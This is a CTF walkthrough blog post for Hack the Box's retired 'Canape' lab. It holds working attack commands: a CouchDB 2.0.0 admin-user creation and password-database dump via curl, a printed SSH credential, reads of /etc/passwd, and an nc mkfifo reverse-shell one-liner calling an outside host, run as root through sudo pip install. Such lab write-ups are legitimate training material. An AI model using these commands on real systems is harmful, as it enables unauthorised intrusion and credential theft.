@@ -1,0 +1,407 @@
+
+								
+																		Hack the Box Challenge: Canape Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 24, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Canape” which is available online for those who want to increase their skill in penetration testing and black box testing. Canape is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Intermediate
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of Canape is 10.10.10.70 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -sV 10.10.10.70
+			
+				
+					
+				
+					1
+				
+						nmap -p- -sV 10.10.10.70
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 80 and 65535 are open on the target system.
+
+As port 80 is running http server, we open the target machine’s IP address in our browser and find that it is a fan site for the Simpsons.
+
+We don’t find anything on the webpage, so we run the dirb scan to enumerate the directories. The target machine responded with 200 OK for every request but for the /.git/Head directory the size of the response changed.
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.70 -f
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.70 -f
+					
+				
+			
+		
+
+
+We open the /.git/ directory and find the config file.
+
+When we open the config file, we find a domain name “git.canape.htb”.
+
+Now we have added the domain name of the target machine in the/etc/hosts file to access the webpage using the IP address as well as a domain name.
+
+Now we can clone the local git repository using the following command:
+
+		
+		
+			
+			
+			
+			
+git clone http://git.canape.htb/simpsons.git
+			
+				
+					
+				
+					1
+				
+						git clone http://git.canape.htb/simpsons.git
+					
+				
+			
+		
+
+Here we found out a file named “__init__.py” in Simpson’s folder as shown in the image.
+
+After downloading the files, we open “__init__.py” and find that this program might be vulnerable insecure deserialization as it uses a vulnerable function “cPickel.loads(data)”.
+
+Now we create a program to exploit this vulnerability and get a reverse shell. You can download the exploit from here.
+
+We set up our listener “netcat” before running the program and run the following command:
+
+		
+		
+			
+			
+			
+			
+nc -lvp 443
+			
+				
+					
+				
+					1
+				
+						nc -lvp 443
+					
+				
+			
+		
+
+
+After getting a reverse shell, we start penetrating more and more. We check for the open ports in the target machine that might be listening locally and find that a service is running on port 5984 for the Apache CouchDB.
+
+		
+		
+			
+			
+			
+			
+netstat -antp
+			
+				
+					
+				
+					1
+				
+						netstat -antp
+					
+				
+			
+		
+
+
+Apache CouchDB is an open source database software. We check the version of CouchDB and also find all the databases using the following command:
+
+		
+		
+			
+			
+			
+			
+curl http://127.0.0.1:5984
+curl http://127.0.0.1:5984/_all_dbs
+			
+				
+					
+				
+					12
+				
+						curl http://127.0.0.1:5984curl http://127.0.0.1:5984/_all_dbs
+					
+				
+			
+		
+
+Using the above command, we find the version of CouchDB to be “2.0.0”. This version of CouchDB is vulnerable to remote privilege escalation. You can find more about this vulnerability here.
+
+Then we create a user with permissions to read the database with the following command.
+
+		
+		
+			
+			
+			
+			
+curl -X PUT 'http://localhost:5984/_users/org.couchDB.user:hack' --data-binary  '{ "type": "user", "name": "hack", "roles": ["_admin"], "roles": [], "password": "password" }’
+			
+				
+					
+				
+					1
+				
+						curl -X PUT 'http://localhost:5984/_users/org.couchDB.user:hack' --data-binary  '{ "type": "user", "name": "hack", "roles": ["_admin"], "roles": [], "password": "password" }’
+					
+				
+			
+		
+
+We then dump the database with the following command:
+
+		
+		
+			
+			
+			
+			
+curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u hack:password
+			
+				
+					
+				
+					1
+				
+						curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u hack:password
+					
+				
+			
+		
+
+The above command will dump the password and we will find the password for SSH login. Now, all we need to do is find the username.
+
+We open /etc/passwd to find users available on the target machine. We find that there is only one proper user called a homer.
+
+		
+		
+			
+			
+			
+			
+cat /etc/passwd
+			
+				
+					
+				
+					1
+				
+						cat /etc/passwd
+					
+				
+			
+		
+
+
+We login through SSH using the credentials we found earlier “homer:0B4jyA0xtytZi7esBNGp”. After login, we find a file ‘user.txt’. We open the file and find our first flag.
+After getting the flag, we checked the sudoers list and find homer has permission to run “pip install *” as the root user.
+
+		
+		
+			
+			
+			
+			
+ssh homer@10.10.10.70 -p65535
+ls
+cat user.txt
+sudo -l
+			
+				
+					
+				
+					1234
+				
+						ssh homer@10.10.10.70 -p65535lscat user.txtsudo -l
+					
+				
+			
+		
+
+
+Now as we know we can run “pip install *” as root, we are going to abuse it by creating a reverse shell and saving it as “setup.py”.
+We are going to use netcat pipe one-liner to get a reverse shell.
+
+		
+		
+			
+			
+			
+			
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f
+			
+				
+					
+				
+					1
+				
+						rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f
+					
+				
+			
+		
+
+
+Now we can run our reverse shell using the following command:
+
+		
+		
+			
+			
+			
+			
+sudo pip install .
+			
+				
+					
+				
+					1
+				
+						sudo pip install .
+					
+				
+			
+		
+
+Remember to set up the listener before running the above command.
+
+As soon as we run our command, we get our reverse shell as the root user. We now move to /root directory and to get “root.txt”. We take a look at the content of the file and find our final flag.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 4444
+id
+cd /root
+ls
+cat root.txt
+			
+				
+					
+				
+					12345
+				
+						nc -lvp 4444idcd /rootlscat root.txt
+					
+				
+			
+		
+
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
